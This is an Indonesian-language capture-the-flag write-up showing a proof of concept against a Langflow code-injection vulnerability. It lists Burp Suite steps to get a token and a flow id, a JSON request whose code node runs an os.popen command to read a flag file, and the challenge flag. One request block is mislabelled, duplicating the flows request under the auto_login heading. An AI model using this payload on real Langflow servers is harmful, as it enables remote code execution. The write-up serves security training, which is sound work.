  # POC - Flowforge (Langflow CVE-2026-33017)

## POC

1. Peserta menggunakan Burp Suite dan buka halamannya.

2. Akan terdapat record /api/v1/auto_login, /api/v1/flows/, dan /api/v1/build_public_tmp/.

3. Untuk /api/v1/auto_login akan digunakan di repeater dan send untuk mendapat token.

4. Untuk /api/v1/flows/ akan digunakan di repeater dengan header Authorization Bearer token dan send untuk mendapat flow id.

5. Untuk /api/v1/build_public_tmp/<id>/flow akan digunakan di repeater dengan body JSON berisi kode Python getattr(os, 'popen') untuk membaca flag.

6. Setelah send, flag muncul di log build pada respons.

## Payload

Request ke /api/v1/auto_login:

```
POST /api/v1/flows/ HTTP/1.1
Host: TARGET
Authorization: Bearer <uuid>
Content-Type: application/json
```

Request ke /api/v1/flows/:

```
POST /api/v1/flows/ HTTP/1.1
Host: TARGET
Authorization: Bearer <uuid>
Content-Type: application/json
```

Body JSON ke /api/v1/build_public_tmp/<id>/flow:

```json
POST /api/v1/build_public_tmp/<flow_id>/flow HTTP/1.1
Host: TARGET
Content-Type: application/json

{
  "data": {
    "nodes": [
      {
        "id": "n1",
        "data": {
          "type": "code",
          "template": {
            "code": {
              "value": "import os\nprint(getattr(os, 'popen')('cat /flag.txt').read())"
            }
          }
        }
      }
    ]
  }
}
```

## Flag

```
CODEX26{fl0wf0rg3_un4uth_c0d3_1nj3ct10n}
```

## Reference
https://github.com/EQSTLab/CVE-2026-33017/blob/main/exploit.py
